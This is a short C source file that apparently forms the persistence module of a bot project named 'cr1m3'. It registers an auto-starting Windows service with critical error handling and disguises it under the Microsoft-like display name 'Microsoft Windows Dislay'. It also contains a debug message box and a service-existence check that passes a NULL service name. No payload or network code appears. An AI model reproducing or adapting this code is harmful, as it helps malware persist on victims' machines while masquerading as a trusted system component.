#include <Windows.h>
#include "config.h"


int __create_service() {
	SC_HANDLE hService,hManager;

	if((hManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS))==NULL)
		return -1;


	if((hService=CreateServiceA(hManager,SERVICE_NAME, "Microsoft Windows Dislay", SC_MANAGER_ALL_ACCESS, 
								SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_CRITICAL, "C:\\repository\\jennylab\\cr1m3\\bot\\cr1m3\\Debug\\cr1m3.exe",
								NULL,NULL,NULL,NULL,NULL))==NULL)
	{
		if((hService=OpenServiceA(hManager,SERVICE_NAME,SC_MANAGER_ALL_ACCESS))==NULL) {
			CloseServiceHandle(hManager);
			return -1;
		}

	}
			
	if(StartServiceA(hService, NULL,NULL)==TRUE) {
		CloseServiceHandle(hManager);
		CloseServiceHandle(hService);
		MessageBoxA(0, "Hello From Service", "AAAA", 0);
		return 1;
	}

	DeleteService(hService);
	CloseServiceHandle(hManager);
	CloseServiceHandle(hService);
	return 0;

}


int __service_exists() {
	SC_HANDLE hManager,hService;
	int ret=0;

	if((hManager=OpenSCManagerA(NULL,NULL,SC_MANAGER_CONNECT))==NULL)
		return -1;

	if((hService=OpenServiceA(hManager, NULL, SC_MANAGER_CONNECT))==NULL)
		ret=0;

	else
		ret=1;

	CloseServiceHandle(hManager);
	CloseServiceHandle(hService);
	return(ret);
}